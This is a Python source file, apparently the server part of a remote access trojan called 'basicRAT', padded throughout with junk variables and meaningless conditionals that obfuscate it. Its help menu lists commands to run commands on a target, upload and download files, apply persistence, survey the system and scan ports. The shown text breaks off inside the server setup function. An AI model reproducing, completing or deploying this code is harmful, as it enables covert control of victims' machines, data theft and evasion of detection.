#!/usr/bin/env python
# -*- coding: utf-8 -*-
hGBARlTuxHnmuINAeGZyCQWesbdsZHDe = 'jJiPwOGbFNjskYuPSEamYTXctkwsYsAH'
aVXiOchCeDfLqbchsTIblUlvZoHTEEtW = 'PwPNAlNlNLQypckeGeyEdRYIZRhtHGYs'
cnCimnTrdNODiuejOjnyHiPeTFhqaWbs = 'YFVzzRTBBbrLJLFfijdbTfIwiXwbAtBn'
if hGBARlTuxHnmuINAeGZyCQWesbdsZHDe == aVXiOchCeDfLqbchsTIblUlvZoHTEEtW:
    JLqBrXULRDWCmXTnoBHNlwDfvvszHSyu = 'epIkFjWLiACdsWDveEvVognhAsXuxqHd'
    JLqBrXULRDWCmXTnoBHNlwDfvvszHSyu = hGBARlTuxHnmuINAeGZyCQWesbdsZHDe
else:
    JLqBrXULRDWCmXTnoBHNlwDfvvszHSyu = 'epIkFjWLiACdsWDveEvVognhAsXuxqHd'
    JLqBrXULRDWCmXTnoBHNlwDfvvszHSyu = cnCimnTrdNODiuejOjnyHiPeTFhqaWbs
""" Basic RAT """
'''   test   '''
TRBgPjCXcpcxxKElWiPpwqvLGvidqYrE = 'ChrVMVxrZASDnzCcsWSmIBrfoWgQkdKD'
esDzFeXUyomEWFIKsWoDavCNFyPoaUGS = 'gVfvnGPoFRJMHPMdJJsZokABJjWOxesc'
hRtlPNYYSOksoNaZbDhZngLVoUESYHyU = 'PQrBoimJSwonwScdozvBdWpADWKilJlI'
mjUeomKDPwzoFfnlkKIATAfpBpjFIdSf = 'xdyFmHTnzDJzpaccvIMYFstYlNHscRgO'
DkkfcjOXzJlyRTLoylmJCNisjmcurXzT = 'lphrrBtFQnIFjqAjRsWTGGMzGNeyYgcA'
UivITFZVDifQxcqlPrLWHkttvxQTXEOM = 'SRtHdBDzhzFdLKiOFCiQAtgZQiYhbhNC'
if hRtlPNYYSOksoNaZbDhZngLVoUESYHyU == mjUeomKDPwzoFfnlkKIATAfpBpjFIdSf:
    for UivITFZVDifQxcqlPrLWHkttvxQTXEOM in DkkfcjOXzJlyRTLoylmJCNisjmcurXzT:
        if UivITFZVDifQxcqlPrLWHkttvxQTXEOM == mjUeomKDPwzoFfnlkKIATAfpBpjFIdSf:
            DkkfcjOXzJlyRTLoylmJCNisjmcurXzT = TRBgPjCXcpcxxKElWiPpwqvLGvidqYrE
        else:
            mjUeomKDPwzoFfnlkKIATAfpBpjFIdSf = esDzFeXUyomEWFIKsWoDavCNFyPoaUGS
import argparse
ZLudbVmovuKJzksbovKLHQBZfXlOZnqF = 'vmpUWUXsvlbOuusEymKUZuoEOepISTgI'
NMbMdMCYMUpPezixdGxhwdzlzPyBEQZJ = 'rWuJlAwAcufoXlzUlCfItGZJnolDrtpa'
ntSlZANKshRMRObTRzCobChfdKAFaSNm = 'AsHjPKNjpHkZgdAtTvGtpclOQPHCWpsb'
DWUMrzjEJTxkZAKaJEHecVmAuzvswDmy = 'LreSWcieYpWfgoTfXwhLmHojDaLnltYn'
DmmEtImlMJeunsbWCGLKkQvUJEvWJqDx = 'CwUadOBrNNpCdcDKFGfvaEmhiLJOGBMi'
wChpJwwevEikQmsyWkEEbkhkDfwSaTTw = 'WUsBjTsSBhbPEwwvtZmbNnatobpsMuNc'
if ntSlZANKshRMRObTRzCobChfdKAFaSNm == DWUMrzjEJTxkZAKaJEHecVmAuzvswDmy:
    for wChpJwwevEikQmsyWkEEbkhkDfwSaTTw in DmmEtImlMJeunsbWCGLKkQvUJEvWJqDx:
        if wChpJwwevEikQmsyWkEEbkhkDfwSaTTw == DWUMrzjEJTxkZAKaJEHecVmAuzvswDmy:
            DmmEtImlMJeunsbWCGLKkQvUJEvWJqDx = ZLudbVmovuKJzksbovKLHQBZfXlOZnqF
        else:
            DWUMrzjEJTxkZAKaJEHecVmAuzvswDmy = NMbMdMCYMUpPezixdGxhwdzlzPyBEQZJ
import readline
FaCdEkfvGYffHtEHhWYGRVGaowpaoeln = 'czBhdqzKwtEMoinybMukHXqLCdMSzYAa'
MZIvjvpZvfPOmMQGYvFnEgIojzJeQtVb = 'fkTbxZaFBhXaQcWBqJrzDtWVEyAaItcz'
PJljEUoZlNkoJNpqDVuDoomAEeMMnmid = 'kMZShzcRowDRqHWoypQWdAgvtEHofAlN'
YsoyHwNQVPIOVzzADicGPTwuEsWmqGsv = 'xjKGeGHCUiHYEzONmNreciNpeUcpRzTX'
rUwdvkIenCeCSgeOipdKhrVJWeslSeHF = 'VEVtrYEXOfCBodkCdNtbQvxmsdsQNQbS'
if FaCdEkfvGYffHtEHhWYGRVGaowpaoeln in MZIvjvpZvfPOmMQGYvFnEgIojzJeQtVb:
    FaCdEkfvGYffHtEHhWYGRVGaowpaoeln = rUwdvkIenCeCSgeOipdKhrVJWeslSeHF
    if MZIvjvpZvfPOmMQGYvFnEgIojzJeQtVb in PJljEUoZlNkoJNpqDVuDoomAEeMMnmid:
        MZIvjvpZvfPOmMQGYvFnEgIojzJeQtVb = YsoyHwNQVPIOVzzADicGPTwuEsWmqGsv
elif MZIvjvpZvfPOmMQGYvFnEgIojzJeQtVb in FaCdEkfvGYffHtEHhWYGRVGaowpaoeln:
    PJljEUoZlNkoJNpqDVuDoomAEeMMnmid = MZIvjvpZvfPOmMQGYvFnEgIojzJeQtVb
    if PJljEUoZlNkoJNpqDVuDoomAEeMMnmid in MZIvjvpZvfPOmMQGYvFnEgIojzJeQtVb:
        MZIvjvpZvfPOmMQGYvFnEgIojzJeQtVb = rUwdvkIenCeCSgeOipdKhrVJWeslSeHF
import socket
wVNVSEEWHkXLqQksoHgrvdFCryuBRtrE = 'DFhjNCrDuQzkawXrjMAhohBtGrgqVxdy'
WLvRxFpURtsEmBBZwFjcRVIyoPDLoPHS = 'lzPoYFglGahpkasOCpJkjKhkhuTMWOxF'
bpZAMdXbDQegDvfDuSFJeaRDHprhiCUK = 'bjxXtLddKndcGocsDdjckCViendsIJwB'
QGfCxzZgVYlzXwcAwpRYwcirRnFllZKu = 'BcdrXwSMzQNooHxmhWBWDBnZflLHxdxW'
sLbUluBcBTMarYFmJvKDcMBoAhQKRZQK = 'TiertLSFMUPZTXurQRmRuqVEjCLpsHpl'
LuKaQctybkOCyxgvrbLbNjWipefEcUiI = 'VpQgNWfLCPeSwAEyZUcJGmLMGwNNANPA'
if wVNVSEEWHkXLqQksoHgrvdFCryuBRtrE != QGfCxzZgVYlzXwcAwpRYwcirRnFllZKu:
    WLvRxFpURtsEmBBZwFjcRVIyoPDLoPHS = bpZAMdXbDQegDvfDuSFJeaRDHprhiCUK
    for LuKaQctybkOCyxgvrbLbNjWipefEcUiI in QGfCxzZgVYlzXwcAwpRYwcirRnFllZKu:
        if LuKaQctybkOCyxgvrbLbNjWipefEcUiI != bpZAMdXbDQegDvfDuSFJeaRDHprhiCUK:
            WLvRxFpURtsEmBBZwFjcRVIyoPDLoPHS = WLvRxFpURtsEmBBZwFjcRVIyoPDLoPHS
        else:
            sLbUluBcBTMarYFmJvKDcMBoAhQKRZQK = wVNVSEEWHkXLqQksoHgrvdFCryuBRtrE
else:
    bpZAMdXbDQegDvfDuSFJeaRDHprhiCUK = wVNVSEEWHkXLqQksoHgrvdFCryuBRtrE
    wVNVSEEWHkXLqQksoHgrvdFCryuBRtrE = sLbUluBcBTMarYFmJvKDcMBoAhQKRZQK
    if bpZAMdXbDQegDvfDuSFJeaRDHprhiCUK == wVNVSEEWHkXLqQksoHgrvdFCryuBRtrE:
        for LuKaQctybkOCyxgvrbLbNjWipefEcUiI in wVNVSEEWHkXLqQksoHgrvdFCryuBRtrE:
            if LuKaQctybkOCyxgvrbLbNjWipefEcUiI == bpZAMdXbDQegDvfDuSFJeaRDHprhiCUK:
                bpZAMdXbDQegDvfDuSFJeaRDHprhiCUK = wVNVSEEWHkXLqQksoHgrvdFCryuBRtrE
            else:
                bpZAMdXbDQegDvfDuSFJeaRDHprhiCUK = sLbUluBcBTMarYFmJvKDcMBoAhQKRZQK
import struct
FwAXDoeAOqjAysEOZayGUKhWAmyxPeuB = 'XBzCmqbEurqcYbieYOQzWZGApeofrCNC'
muPYdfkRtiMJZWsghXaHVNmWrZzrfmdF = 'AkBilrtBgVINahKAUqKwBbaUtvNhnqKz'
ExdIiRhhVvZDToVxmbZgOocvUjUhiHJR = 'UGxNUnAtCEzYILaXNqnDpFSOTXnDZrFZ'
hPYjKEyRcsrpkGbUxWfVDuvkeDldxuWu = 'xmxGmCvcyOZfYsZIfRiZJHSqfdUobaaO'
eMOvgYKaPeZaWesnjCXKKVjCEWnwaEJP = 'wfFTWTrALIrgIZQekUlLshXPQWhWxfVq'
LQalQBcdIGhwASitKfGqYlZWvBNDqfgt = 'uFqktmzseQqDDAjXqDyytrTkOSFPUlFX'
if FwAXDoeAOqjAysEOZayGUKhWAmyxPeuB != hPYjKEyRcsrpkGbUxWfVDuvkeDldxuWu:
    muPYdfkRtiMJZWsghXaHVNmWrZzrfmdF = ExdIiRhhVvZDToVxmbZgOocvUjUhiHJR
    for LQalQBcdIGhwASitKfGqYlZWvBNDqfgt in hPYjKEyRcsrpkGbUxWfVDuvkeDldxuWu:
        if LQalQBcdIGhwASitKfGqYlZWvBNDqfgt != ExdIiRhhVvZDToVxmbZgOocvUjUhiHJR:
            muPYdfkRtiMJZWsghXaHVNmWrZzrfmdF = muPYdfkRtiMJZWsghXaHVNmWrZzrfmdF
        else:
            eMOvgYKaPeZaWesnjCXKKVjCEWnwaEJP = FwAXDoeAOqjAysEOZayGUKhWAmyxPeuB
else:
    ExdIiRhhVvZDToVxmbZgOocvUjUhiHJR = FwAXDoeAOqjAysEOZayGUKhWAmyxPeuB
    FwAXDoeAOqjAysEOZayGUKhWAmyxPeuB = eMOvgYKaPeZaWesnjCXKKVjCEWnwaEJP
    if ExdIiRhhVvZDToVxmbZgOocvUjUhiHJR == FwAXDoeAOqjAysEOZayGUKhWAmyxPeuB:
        for LQalQBcdIGhwASitKfGqYlZWvBNDqfgt in FwAXDoeAOqjAysEOZayGUKhWAmyxPeuB:
            if LQalQBcdIGhwASitKfGqYlZWvBNDqfgt == ExdIiRhhVvZDToVxmbZgOocvUjUhiHJR:
                ExdIiRhhVvZDToVxmbZgOocvUjUhiHJR = FwAXDoeAOqjAysEOZayGUKhWAmyxPeuB
            else:
                ExdIiRhhVvZDToVxmbZgOocvUjUhiHJR = eMOvgYKaPeZaWesnjCXKKVjCEWnwaEJP
import sys
ZgdRYjHhnNCpMVAeTunZuACMyQQVnqUt = 'oKLYEyKGLwxRuMmFdLVInWoGjcbgHgEH'
RYgVIndFcSTOypVMASnNvQTNBrzQUbCj = 'QKxhZCHUYuVlxflmmVuInlpsShIxCzRm'
xfFlCehPBlXtfOgaXKLcIdHoaTZEYuZy = 'aHyjMrAmSgNJuCwxOTapCHdUGzONqdQS'
GXTpGpHDBfvyUrkiHUJhYCqrLUBUcimS = 'VYozQESwxYVkQmxKkFvgcWtbyPlXafSh'
SbkQHRiEmeZxbjBpbrJyfJtWjSuVNVKK = 'qcSUpsKcINzIZulRaEOIkUggwzfxwlxK'
yiXBToUqjwcxrMYoWugDUoLvGGohGdsX = 'IvimKtjcEOkzzqotGPzDSAjNxnrZzjCR'
if ZgdRYjHhnNCpMVAeTunZuACMyQQVnqUt != GXTpGpHDBfvyUrkiHUJhYCqrLUBUcimS:
    RYgVIndFcSTOypVMASnNvQTNBrzQUbCj = xfFlCehPBlXtfOgaXKLcIdHoaTZEYuZy
    for yiXBToUqjwcxrMYoWugDUoLvGGohGdsX in GXTpGpHDBfvyUrkiHUJhYCqrLUBUcimS:
        if yiXBToUqjwcxrMYoWugDUoLvGGohGdsX != xfFlCehPBlXtfOgaXKLcIdHoaTZEYuZy:
            RYgVIndFcSTOypVMASnNvQTNBrzQUbCj = RYgVIndFcSTOypVMASnNvQTNBrzQUbCj
        else:
            SbkQHRiEmeZxbjBpbrJyfJtWjSuVNVKK = ZgdRYjHhnNCpMVAeTunZuACMyQQVnqUt
else:
    xfFlCehPBlXtfOgaXKLcIdHoaTZEYuZy = ZgdRYjHhnNCpMVAeTunZuACMyQQVnqUt
    ZgdRYjHhnNCpMVAeTunZuACMyQQVnqUt = SbkQHRiEmeZxbjBpbrJyfJtWjSuVNVKK
    if xfFlCehPBlXtfOgaXKLcIdHoaTZEYuZy == ZgdRYjHhnNCpMVAeTunZuACMyQQVnqUt:
        for yiXBToUqjwcxrMYoWugDUoLvGGohGdsX in ZgdRYjHhnNCpMVAeTunZuACMyQQVnqUt:
            if yiXBToUqjwcxrMYoWugDUoLvGGohGdsX == xfFlCehPBlXtfOgaXKLcIdHoaTZEYuZy:
                xfFlCehPBlXtfOgaXKLcIdHoaTZEYuZy = ZgdRYjHhnNCpMVAeTunZuACMyQQVnqUt
            else:
                xfFlCehPBlXtfOgaXKLcIdHoaTZEYuZy = SbkQHRiEmeZxbjBpbrJyfJtWjSuVNVKK
import time
IenjZqnVxImgfXIQrLmwVgLWTvsUwsbx = 'zKUkDAjGsSXsIifIeqECAmIAIIoRaUlt'
VhsVhDDczohxPvZElQOJzKXaKXFcnWuT = 'WoTgHMaEOdiSuDkiukbEGMxZcXWNmMWW'
bukUnkNupWMWZHznxIQmpKSPzcyZPPRM = 'lsfrAOrLYCmsebFdCaGTdeYFJbrnsDWN'
XqlvyUIRrPfiwZtmWrHyCMRYHwAaRErU = 'FBdGJxnIsjYBijoLDBZfNBXntfUhRpEG'
RAXpFIVTCJheKqTWnturbubdeVtlpAcv = 'HrZTPPPpTaIXCNcngApuADRMgAipWMUZ'
if IenjZqnVxImgfXIQrLmwVgLWTvsUwsbx in VhsVhDDczohxPvZElQOJzKXaKXFcnWuT:
    IenjZqnVxImgfXIQrLmwVgLWTvsUwsbx = RAXpFIVTCJheKqTWnturbubdeVtlpAcv
    if VhsVhDDczohxPvZElQOJzKXaKXFcnWuT in bukUnkNupWMWZHznxIQmpKSPzcyZPPRM:
        VhsVhDDczohxPvZElQOJzKXaKXFcnWuT = XqlvyUIRrPfiwZtmWrHyCMRYHwAaRErU
elif VhsVhDDczohxPvZElQOJzKXaKXFcnWuT in IenjZqnVxImgfXIQrLmwVgLWTvsUwsbx:
    bukUnkNupWMWZHznxIQmpKSPzcyZPPRM = VhsVhDDczohxPvZElQOJzKXaKXFcnWuT
    if bukUnkNupWMWZHznxIQmpKSPzcyZPPRM in VhsVhDDczohxPvZElQOJzKXaKXFcnWuT:
        VhsVhDDczohxPvZElQOJzKXaKXFcnWuT = RAXpFIVTCJheKqTWnturbubdeVtlpAcv
try:
    AlKDBCSKbSlQJpsZVzSXwMflKPXjDmEr = 'QTXLWkcWuebrPucSplxRmnoaaTGpKFkS'
    ZPMhshhUgEpdGbMWneqLrnteHObjJODD = 'noirNZSfXVxOpZeLlCvaVXmwtEeeQOsW'
    sHTKTkKQFrqtzvbLLKOWPmjmhfHQmdDg = 'NOvyDAMrdnqGIZCuXkppOBaquDhlbjOg'
    OEMurDHhtuwruAQHctGPsrnxCpVskktH = 'XIwJnatIdUaSZivDucpnBqytJsDLCokv'
    haqGFtFQugLeKXnlQDAJgrqTJOCdYuLq = 'shpGdmsZyKEjmptRReNgSuYhkZLjHLpY'
    if AlKDBCSKbSlQJpsZVzSXwMflKPXjDmEr in ZPMhshhUgEpdGbMWneqLrnteHObjJODD:
        AlKDBCSKbSlQJpsZVzSXwMflKPXjDmEr = haqGFtFQugLeKXnlQDAJgrqTJOCdYuLq
        if ZPMhshhUgEpdGbMWneqLrnteHObjJODD in sHTKTkKQFrqtzvbLLKOWPmjmhfHQmdDg:
            ZPMhshhUgEpdGbMWneqLrnteHObjJODD = OEMurDHhtuwruAQHctGPsrnxCpVskktH
    elif ZPMhshhUgEpdGbMWneqLrnteHObjJODD in AlKDBCSKbSlQJpsZVzSXwMflKPXjDmEr:
        sHTKTkKQFrqtzvbLLKOWPmjmhfHQmdDg = ZPMhshhUgEpdGbMWneqLrnteHObjJODD
        if sHTKTkKQFrqtzvbLLKOWPmjmhfHQmdDg in ZPMhshhUgEpdGbMWneqLrnteHObjJODD:
            ZPMhshhUgEpdGbMWneqLrnteHObjJODD = haqGFtFQugLeKXnlQDAJgrqTJOCdYuLq
    from core.crypto import bWtlivskZCwkkAfMYrPiAvIokwvvoWcD,yMJpVmADtfOFNuYBnBVUdcWvfJqpMgZu,ejviyCNkcSZJfLMoBkJdCaGLsZpnMUmN
    uIaTzFSOfdFBrZxgLCWMoRIcWtdHMuqC = 'okgLZyfBUgEAZdCGcwwBTpPXAehXoulL'
    gaOzIQsDnWRmMoKkjOvWnRpnCSlRJCoV = 'RZlksnxRTQDWnBCmJLNgRcgVNVrSXqEP'
    if uIaTzFSOfdFBrZxgLCWMoRIcWtdHMuqC != gaOzIQsDnWRmMoKkjOvWnRpnCSlRJCoV:
        fGsHSbKVrCUHLyaSTOkbSwbKUnCoWFBl = 'FFDuUHlDAByVMAZvQYFYPEnnyExOsvZz'
        LqOdVUVkZmvHewsWhGKuNEeQVlZCRoNM = 'lOyIfKcyCOBuVQHUYpjWqFyGMqMuvHvB'
        LqOdVUVkZmvHewsWhGKuNEeQVlZCRoNM = fGsHSbKVrCUHLyaSTOkbSwbKUnCoWFBl
    from core.filesock import OWpYpOpSPJpgHOwScrENXbxmAmIcFHCq, jpcIoIirVbyQvKBDBSJylGVgqeBgwYWB
    SzhLiLKCXFjNAbjkhYoIOljQCzLZscgA = 'XqBozasoLcTuZxYimRIlNLRNOhPSJHpz'
    UTMaFfDFaPTSAqQWyuaQRNeHswVbdMuH = 'RseBTQylKdfwqbscCsDhKoIYVZPztfFd'
    if SzhLiLKCXFjNAbjkhYoIOljQCzLZscgA != UTMaFfDFaPTSAqQWyuaQRNeHswVbdMuH:
        sjewDHfMpxOkoaYFXvaQMbyekLBhsxUu = 'jByMDQjkntjLywpVvOQpTqiSijflrtdc'
        DBuuNXUZcsClUrwIDSrUJBBEdpxSqafJ = 'tdybKGntwutQufJthvPPXRaVxEahDWjn'
        DBuuNXUZcsClUrwIDSrUJBBEdpxSqafJ = sjewDHfMpxOkoaYFXvaQMbyekLBhsxUu
except ImportError as IYwvcTmjgleLEiLZxfptmZMrzrtSNUNY:
    HzFpzYMJktnQtJDhKYQWFyDmwxOQKNtS = 'kLcKqYgBwtGRLPGSmtCZOWzqkopSmVDz'
    saNMziApHwHzUBXpBrksEnynVRBbLwXG = 'JjgbyXDAxZUUdHHAplHnLNXaOrmqLhVm'
    WSISySQWucTxtcEFEAlbjJWJspPbFFaf = 'BYYIBJrnAoPGzUBilRSseywBeEQLluzb'
    gYOiNBaKMwiPKKCLZBFIrjBOFRelBZPi = 'ftgDFuprwHgCREMiCKuHSlDRhRQxvQBE'
    ghKaPsLjItjyKGQuDJoCTIBbfkrDtrjL = 'qdsGyAjuSqpcySbJpMuaWzwlDAaVuzJB'
    kftFncTCyJpBjsQaNcAzlEeNjHjKQgdk = 'ukNhyynBlrBDkigrQvifxjGsYdSpVAIL'
    if HzFpzYMJktnQtJDhKYQWFyDmwxOQKNtS != gYOiNBaKMwiPKKCLZBFIrjBOFRelBZPi:
        saNMziApHwHzUBXpBrksEnynVRBbLwXG = WSISySQWucTxtcEFEAlbjJWJspPbFFaf
        for kftFncTCyJpBjsQaNcAzlEeNjHjKQgdk in gYOiNBaKMwiPKKCLZBFIrjBOFRelBZPi:
            if kftFncTCyJpBjsQaNcAzlEeNjHjKQgdk != WSISySQWucTxtcEFEAlbjJWJspPbFFaf:
                saNMziApHwHzUBXpBrksEnynVRBbLwXG = saNMziApHwHzUBXpBrksEnynVRBbLwXG
            else:
                ghKaPsLjItjyKGQuDJoCTIBbfkrDtrjL = HzFpzYMJktnQtJDhKYQWFyDmwxOQKNtS
    else:
        WSISySQWucTxtcEFEAlbjJWJspPbFFaf = HzFpzYMJktnQtJDhKYQWFyDmwxOQKNtS
        HzFpzYMJktnQtJDhKYQWFyDmwxOQKNtS = ghKaPsLjItjyKGQuDJoCTIBbfkrDtrjL
        if WSISySQWucTxtcEFEAlbjJWJspPbFFaf == HzFpzYMJktnQtJDhKYQWFyDmwxOQKNtS:
            for kftFncTCyJpBjsQaNcAzlEeNjHjKQgdk in HzFpzYMJktnQtJDhKYQWFyDmwxOQKNtS:
                if kftFncTCyJpBjsQaNcAzlEeNjHjKQgdk == WSISySQWucTxtcEFEAlbjJWJspPbFFaf:
                    WSISySQWucTxtcEFEAlbjJWJspPbFFaf = HzFpzYMJktnQtJDhKYQWFyDmwxOQKNtS
                else:
                    WSISySQWucTxtcEFEAlbjJWJspPbFFaf = ghKaPsLjItjyKGQuDJoCTIBbfkrDtrjL
    ChxNWLJxdSYuQXffSxPBUkzXfWqOmQmY = 'CZfxLwtyKIfgiDpfjOAtdMPOUeZySEAf'
    FpdXoZdOfnjUvMOcGXBXZMYgOwhyWOuL = 'AueHgssRLuRszbJATmIjCAWSWACbusuB'
    ZczWuEDBgvqMygPUjoscEsQmFDxuWuKB = 'AjARZSRxsGWKlFFVihoQhZWMPBHZqcbK'
    MNsHZQHEWobIAUWQTEsEGSactAWNisem = 'UDyCfcSgPocQSqXgQaOoXYXtBMLKthdF'
    VzLKbLesCINIMpMtpixakvPEyKaqUXBy = 'qOjHujOEnTnZDMqwoimSZnDKdBfofYyo'
    if ChxNWLJxdSYuQXffSxPBUkzXfWqOmQmY in FpdXoZdOfnjUvMOcGXBXZMYgOwhyWOuL:
        ChxNWLJxdSYuQXffSxPBUkzXfWqOmQmY = VzLKbLesCINIMpMtpixakvPEyKaqUXBy
        if FpdXoZdOfnjUvMOcGXBXZMYgOwhyWOuL in ZczWuEDBgvqMygPUjoscEsQmFDxuWuKB:
            FpdXoZdOfnjUvMOcGXBXZMYgOwhyWOuL = MNsHZQHEWobIAUWQTEsEGSactAWNisem
    elif FpdXoZdOfnjUvMOcGXBXZMYgOwhyWOuL in ChxNWLJxdSYuQXffSxPBUkzXfWqOmQmY:
        ZczWuEDBgvqMygPUjoscEsQmFDxuWuKB = FpdXoZdOfnjUvMOcGXBXZMYgOwhyWOuL
        if ZczWuEDBgvqMygPUjoscEsQmFDxuWuKB in FpdXoZdOfnjUvMOcGXBXZMYgOwhyWOuL:
            FpdXoZdOfnjUvMOcGXBXZMYgOwhyWOuL = VzLKbLesCINIMpMtpixakvPEyKaqUXBy
    sys.exit(0)
    HspykplFGQATATjYcXzIRjGORPcJpiru = 'tLiZRFwFGPInbqXbFcRgircckSQmqLxB'
    SQbbgKWpdaEexcbSadMqUHvIuuYEsCfr = 'OuQPeqtjZeTmmiXvdNuHpILNfZVaXvzz'
    ysPVUNNFleCpnmXLqPFZZxRFBCEgcvGP = 'VTCaSNuBLvjjXZWhzjFhWKrGojkdCBeC'
    CMfYVkGkFREEyrccPeTkyLZZobpfemJp = 'dXtSFdqodlATVcspQPlrmdwtQhndEqpd'
    gSeAaFjacxiHSFMAdpmfEuNNtKqmGXpr = 'lRnRTzpxOvhqZjptSWkYYyxYeocEhuak'
    SSOCwYyCNPUIWNVYQvkcctkXwRSinLin = 'SOLWrfIInqGWFlsRJMRqtwbNNmbPhasj'
    if HspykplFGQATATjYcXzIRjGORPcJpiru != CMfYVkGkFREEyrccPeTkyLZZobpfemJp:
        SQbbgKWpdaEexcbSadMqUHvIuuYEsCfr = ysPVUNNFleCpnmXLqPFZZxRFBCEgcvGP
        for SSOCwYyCNPUIWNVYQvkcctkXwRSinLin in CMfYVkGkFREEyrccPeTkyLZZobpfemJp:
            if SSOCwYyCNPUIWNVYQvkcctkXwRSinLin != ysPVUNNFleCpnmXLqPFZZxRFBCEgcvGP:
                SQbbgKWpdaEexcbSadMqUHvIuuYEsCfr = SQbbgKWpdaEexcbSadMqUHvIuuYEsCfr
            else:
                gSeAaFjacxiHSFMAdpmfEuNNtKqmGXpr = HspykplFGQATATjYcXzIRjGORPcJpiru
    else:
        ysPVUNNFleCpnmXLqPFZZxRFBCEgcvGP = HspykplFGQATATjYcXzIRjGORPcJpiru
        HspykplFGQATATjYcXzIRjGORPcJpiru = gSeAaFjacxiHSFMAdpmfEuNNtKqmGXpr
        if ysPVUNNFleCpnmXLqPFZZxRFBCEgcvGP == HspykplFGQATATjYcXzIRjGORPcJpiru:
            for SSOCwYyCNPUIWNVYQvkcctkXwRSinLin in HspykplFGQATATjYcXzIRjGORPcJpiru:
                if SSOCwYyCNPUIWNVYQvkcctkXwRSinLin == ysPVUNNFleCpnmXLqPFZZxRFBCEgcvGP:
                    ysPVUNNFleCpnmXLqPFZZxRFBCEgcvGP = HspykplFGQATATjYcXzIRjGORPcJpiru
                else:
                    ysPVUNNFleCpnmXLqPFZZxRFBCEgcvGP = gSeAaFjacxiHSFMAdpmfEuNNtKqmGXpr
IunhNPbNniFdTqbAPWeVdGGfrrwnTrCe = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
HeEyHiHrZXqRihgnbLNpSrIlyWMkKWfo = 'zpgJGrSvtXEbQmFNgiwIRnqdoAfrvdOQ'
KjhqHzjJzWUqMvEhxyfQScuPVdmCYQcx = 'cgtVFNdIruRVxtVxnDIbJRGzrOsPaoEn'
if HeEyHiHrZXqRihgnbLNpSrIlyWMkKWfo != KjhqHzjJzWUqMvEhxyfQScuPVdmCYQcx:
    gQalKZKqclbogmGgsnvCYNBVHnPQYQjg = 'LYaTkBhykJntkNnAXtfSzoQxjEniSMBk'
    qEdNAMTDlwRXFdAjKuLVhXthsqqoCyQz = 'dMCRiBUXaRphfUARxBTeAkcZDkVhJBvI'
    qEdNAMTDlwRXFdAjKuLVhXthsqqoCyQz = gQalKZKqclbogmGgsnvCYNBVHnPQYQjg
HrfWznprFGdIdSXLPsrjNgKLvtsWEdNq = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
qXQLWqZEJuoxgfSKYjSqwaGFoFtffGQW = 'XMuvGBPcidUGtTobqWLNYqBBmIpFqSQv'
nSUXXeHrboFdplbHgkeGbTXzBHrOPtWB = 'OeBBnYgNloyxmFLOMVJYtCJlLtphzVkr'
pxHWIjlwiRPMWDMtvUKZQgiGINnRyFIY = 'uZHDJSusFHwnLtjizDASvgcMbCbBRadK'
NiRPvwMqEdGxfjzpJHWqiFYxPnWWVwgt = 'SVjJypiZeUqFHQYUAjMtqQyiWkyldfAP'
cFeMfdgrDDnwJRgFgrWycrOepkSlESzy = 'ftrtbyGalwEpUswKimqKnmzQJirpQPoX'
MozcCqFIumThYliaybdBqSlhZVirOjeT = 'lryFZFRqTjuYjmsQQYJoDlvJgJPNZrLk'
if pxHWIjlwiRPMWDMtvUKZQgiGINnRyFIY == NiRPvwMqEdGxfjzpJHWqiFYxPnWWVwgt:
    for MozcCqFIumThYliaybdBqSlhZVirOjeT in cFeMfdgrDDnwJRgFgrWycrOepkSlESzy:
        if MozcCqFIumThYliaybdBqSlhZVirOjeT == NiRPvwMqEdGxfjzpJHWqiFYxPnWWVwgt:
            cFeMfdgrDDnwJRgFgrWycrOepkSlESzy = qXQLWqZEJuoxgfSKYjSqwaGFoFtffGQW
        else:
            NiRPvwMqEdGxfjzpJHWqiFYxPnWWVwgt = nSUXXeHrboFdplbHgkeGbTXzBHrOPtWB
WIavQQQtDuOddPLHdhBtixjDDXzMoGRS = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
             'scan', 'survey', 'unzip', 'upload', 'wget' ]
def MdEigbPFyJLXCpINmJbNMohglywkLWxa():
    AIQXRpFusIDilsHBRxPmlpbTpkjLtKtO = 'yCjNWgrbRsdwgGAMMthBQdNWktvXQKQg'
    mCEWEhgANCcmaqYPbHjHtlMrfNGUCokX = 'LrrDuyaYuDxZxlsPfDXKaNyKTfRwjusj'
    if AIQXRpFusIDilsHBRxPmlpbTpkjLtKtO != mCEWEhgANCcmaqYPbHjHtlMrfNGUCokX:
        AmUFokOOtFiYwawNBEzLuDhDPiJnqdjM = 'WdrcivPaHxHBSvJFdoogRyQYgqdVytCZ'
        UClaqMUZLrCrOjRfRVvZUMdbQacKbzHT = 'JBpiIZzsXsqZfjlnDWFgrELfeIbdQbqU'
        UClaqMUZLrCrOjRfRVvZUMdbQacKbzHT = AmUFokOOtFiYwawNBEzLuDhDPiJnqdjM
    dCFeAsflpFWIYsKiFMxmNLgRzBQnNutn = argparse.ArgumentParser(description='basicRAT server')
    cvtueIRURVPRkJZAERFqHEsxXjrnvFiQ = 'FySJIMEmEOdvKJAjKXtwLiXdRfevPsLg'
    qZYJcDbDbjpYBBJxDjBwuOrXvWzkvUhR = 'RTpUIHEzWZWZsWOtaGaHlTpwDMohPxJV'
    hRXFGvdGuNvUTcxQhsgXBLyBnYcuagCY = 'ZnbKMHMEKkDdswPqaqrEDaSIkToKryTP'
    MhFqUxjsIODqjXYBmEvLQsUTaetyuchR = 'NVeTquYJaxWEmFYzuqHwnvcOSBAIpkhi'
    gygUziAbNZrPKkPMFcPiHNQWzWxwDXjQ = 'wshOfSTIOhZYYHoKJtrssujIjfSIjaoF'
    cKqlAVsqTIoXWaXHFnjjWOIdcIBMGWJo = 'axqOhjVRhAxFyFxAKtewszBiDRUlrRww'
